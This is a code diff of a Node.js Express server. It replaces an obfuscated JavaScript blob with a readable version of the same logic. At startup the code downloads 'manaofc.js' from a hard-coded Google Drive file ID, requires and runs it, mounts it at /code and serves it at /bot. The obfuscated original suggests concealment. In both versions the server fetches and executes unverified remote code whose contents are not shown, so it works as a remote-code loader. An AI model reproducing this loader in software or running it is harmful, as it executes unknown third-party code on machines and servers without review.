@@ -1,2 +1,81 @@
+const express = require('express');
+const path = require('path');
+const fs = require('fs');
+const axios = require('axios');
+
+const app = express();
+const PORT = process.env.PORT || 8000;
+
+require('events').EventEmitter.defaultMaxListeners = 500;
+
+// ===== Middleware =====
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+// ===== Google Drive Config =====
 const API = '1txoH16hqTCBIiWPYofRWrPzNvzUP1SzY'; 
-function _0x4369(){const _0x2f3b71=['exports','defaultMax','oad&id=','dAFAK','ive.google','stream','/bot','http://loc','🚀\x20Server\x20r','events','hQqMT','listen','2184996ikBpfy','manaofc.js','QJOTN','\x20exists','/code','log','js\x20already','ing\x20manaof','25450FZugCN','rver:','zDLeJ','Listeners','PzRGW','createWrit','o\x20start\x20se','83136totmVV','existsSync','EventEmitt','finish','js\x20downloa','⬇\x20Download','QlNBP','https://dr','16JRIVEK','path','c.js...','QGlQG','32166KyoXQV','data','3813198gDiQqT','5mttDLW','mLUdx','.com/uc?ex','UyZVB','pipe','dZPjB','urlencoded','PZfQU','OFdeV','noOjz','3030312txwtiB','qMRBG','28lfWSop','get','sqplQ','unning\x20on\x20','port=downl','axios','sendFile','CFNvS','GET','alhost:','9HRsoaU','./manaofc','express','1347199XQzbCk','eStream','❌\x20Failed\x20t','rsRwe','ded','main.html','function','join','Jhjqb','error','✔\x20manaofc.','1529iJJXai','json','use'];_0x4369=function(){return _0x2f3b71;};return _0x4369();}const _0x192f4d=_0x4180;(function(_0x437438,_0x38f1fe){const _0x895e38=_0x4180,_0x4aa2d6=_0x437438();while(!![]){try{const _0x578eaa=-parseInt(_0x895e38(0x118))/(-0x2*0xfef+-0x1094+0x1*0x3073)*(-parseInt(_0x895e38(0x109))/(0x161c+-0x75c+-0xebe))+parseInt(_0x895e38(0x13f))/(0x171c+0x61*-0xb+-0x12ee)+-parseInt(_0x895e38(0x116))/(0x117b+0x1fa5*-0x1+-0xe2e*-0x1)+parseInt(_0x895e38(0x10c))/(-0xdd*-0x4+-0x3f0+0x81)*(parseInt(_0x895e38(0x10b))/(-0x1*0x1469+0xe6f+0x600))+-parseInt(_0x895e38(0x125))/(0x25af+-0x11*0x16d+-0x3*0x479)*(-parseInt(_0x895e38(0x105))/(-0x15f1+0x166e+-0x75))+-parseInt(_0x895e38(0x122))/(0x1*0x21a9+-0x86c+0xc9a*-0x2)*(-parseInt(_0x895e38(0xf6))/(0x6*0x2d3+-0x22c2+0x11da))+-parseInt(_0x895e38(0x130))/(-0x2d+0x1c9b*-0x1+0x1cd3)*(parseInt(_0x895e38(0xfd))/(-0x3*-0x8cf+0x1115+0x15bb*-0x2));if(_0x578eaa===_0x38f1fe)break;else _0x4aa2d6['push'](_0x4aa2d6['shift']());}catch(_0x4951e6){_0x4aa2d6['push'](_0x4aa2d6['shift']());}}}(_0x4369,-0x35a*0x335+0xce005*-0x1+-0x1ef6dd*-0x1));const express=require(_0x192f4d(0x124)),path=require(_0x192f4d(0x106)),fs=require('fs'),axios=require(_0x192f4d(0x11d)),app=express(),PORT=process.env.PORT||-0xace+0x1*0x2d35+0x10d*-0x3;require(_0x192f4d(0x13c))[_0x192f4d(0xff)+'er'][_0x192f4d(0x134)+_0x192f4d(0xf9)]=0x5*-0x6ef+-0x79*-0x1b+0x17dc,app[_0x192f4d(0x132)](express[_0x192f4d(0x131)]()),app[_0x192f4d(0x132)](express[_0x192f4d(0x112)]({'extended':!![]}));const MANAOFC_PATH=path[_0x192f4d(0x12c)](__dirname,_0x192f4d(0xef));function _0x4180(_0x27db8f,_0x3bdb07){_0x27db8f=_0x27db8f-(0x3*0x4a2+0x797*-0x1+-0x560);const _0x234d1e=_0x4369();let _0x346344=_0x234d1e[_0x27db8f];return _0x346344;}async function downloadManaofc(){const _0x5aa795=_0x192f4d,_0x3c8739={'sqplQ':_0x5aa795(0x100),'UyZVB':_0x5aa795(0x12e),'dZPjB':_0x5aa795(0x12f)+_0x5aa795(0xf4)+_0x5aa795(0xf1),'QJOTN':_0x5aa795(0x102)+_0x5aa795(0xf5)+_0x5aa795(0x107),'dAFAK':function(_0x31568e,_0xd9b73f){return _0x31568e(_0xd9b73f);},'QGlQG':_0x5aa795(0x120),'PzRGW':_0x5aa795(0x138),'PZfQU':_0x5aa795(0x12f)+_0x5aa795(0x101)+_0x5aa795(0x129)};if(fs[_0x5aa795(0xfe)](MANAOFC_PATH)){console[_0x5aa795(0xf3)](_0x3c8739[_0x5aa795(0x111)]);return;}const _0x353280=_0x5aa795(0x104)+_0x5aa795(0x137)+_0x5aa795(0x10e)+_0x5aa795(0x11c)+_0x5aa795(0x135)+API;console[_0x5aa795(0xf3)](_0x3c8739[_0x5aa795(0xf0)]);const _0x12cf68=await _0x3c8739[_0x5aa795(0x136)](axios,{'url':_0x353280,'method':_0x3c8739[_0x5aa795(0x108)],'responseType':_0x3c8739[_0x5aa795(0xfa)]});await new Promise((_0x20be99,_0x3e02ce)=>{const _0x22ddad=_0x5aa795,_0x4095ea=fs[_0x22ddad(0xfb)+_0x22ddad(0x126)](MANAOFC_PATH);_0x12cf68[_0x22ddad(0x10a)][_0x22ddad(0x110)](_0x4095ea),_0x4095ea['on'](_0x3c8739[_0x22ddad(0x11a)],_0x20be99),_0x4095ea['on'](_0x3c8739[_0x22ddad(0x10f)],_0x3e02ce);}),console[_0x5aa795(0xf3)](_0x3c8739[_0x5aa795(0x113)]);}async function start(){const _0x36cd89=_0x192f4d,_0x459923={'CFNvS':_0x36cd89(0x12a),'Jhjqb':function(_0xf26dc2){return _0xf26dc2();},'mLUdx':function(_0x306a0d,_0xe0f2db){return _0x306a0d(_0xe0f2db);},'zDLeJ':_0x36cd89(0x123),'hQqMT':function(_0x5f43e3,_0x5365b5){return _0x5f43e3===_0x5365b5;},'QlNBP':_0x36cd89(0x12b),'qMRBG':function(_0x3dbd38){return _0x3dbd38();},'noOjz':_0x36cd89(0xf2),'OFdeV':_0x36cd89(0x139),'rsRwe':_0x36cd89(0x127)+_0x36cd89(0xfc)+_0x36cd89(0xf7)};try{await _0x459923[_0x36cd89(0x12d)](downloadManaofc);const _0x3697d7=_0x459923[_0x36cd89(0x10d)](require,_0x459923[_0x36cd89(0xf8)]);_0x459923[_0x36cd89(0x13d)](typeof _0x3697d7,_0x459923[_0x36cd89(0x103)])&&_0x459923[_0x36cd89(0x117)](_0x3697d7),app[_0x36cd89(0x132)](_0x459923[_0x36cd89(0x115)],_0x3697d7),app[_0x36cd89(0x119)](_0x459923[_0x36cd89(0x114)],(_0x3d05bc,_0x4d042d)=>{const _0xc03f32=_0x36cd89;_0x4d042d[_0xc03f32(0x11e)](MANAOFC_PATH);}),app[_0x36cd89(0x119)]('/',(_0x4d6259,_0x58bc18)=>{const _0xda7786=_0x36cd89;_0x58bc18[_0xda7786(0x11e)](path[_0xda7786(0x12c)](__dirname,_0x459923[_0xda7786(0x11f)]));}),app[_0x36cd89(0x13e)](PORT,()=>{const _0x537ead=_0x36cd89;console[_0x537ead(0xf3)](_0x537ead(0x13b)+_0x537ead(0x11b)+_0x537ead(0x13a)+_0x537ead(0x121)+PORT);});}catch(_0x5ba3db){console[_0x36cd89(0x12e)](_0x459923[_0x36cd89(0x128)],_0x5ba3db);}}start(),module[_0x192f4d(0x133)]=app;
+const MANAOFC_PATH = path.join(__dirname, 'manaofc.js');
+
+// ===== Download manaofc.js if not exists =====
+async function downloadManaofc() {
+    if (fs.existsSync(MANAOFC_PATH)) {
+        console.log('✔ manaofc.js already exists');
+        return;
+    }
+
+    const url = `https://drive.google.com/uc?export=download&id=${API}`;
+    console.log('⬇ Downloading manaofc.js...');
+
+    const response = await axios({
+        url,
+        method: 'GET',
+        responseType: 'stream'
+    });
+
+    await new Promise((resolve, reject) => {
+        const stream = fs.createWriteStream(MANAOFC_PATH);
+        response.data.pipe(stream);
+        stream.on('finish', resolve);
+        stream.on('error', reject);
+    });
+
+    console.log('✔ manaofc.js downloaded');
+}
+
+// ===== Start Server =====
+async function start() {
+    try {
+        await downloadManaofc();
+
+        // Require AFTER download
+        const code = require('./manaofc');
+
+        // If manaofc exports a function, run it
+        if (typeof code === 'function') {
+            code();
+        }
+
+        // Routes
+        app.use('/code', code);
+
+        app.get('/bot', (req, res) => {
+            res.sendFile(MANAOFC_PATH);
+        });
+
+        app.get('/', (req, res) => {
+            res.sendFile(path.join(__dirname, 'main.html'));
+        });
+
+        app.listen(PORT, () => {
+            console.log(`🚀 Server running on http://localhost:${PORT}`);
+        });
+
+    } catch (err) {
+        console.error('❌ Failed to start server:', err);
+    }
+}
+
+start();
+
+module.exports = app;
+ 
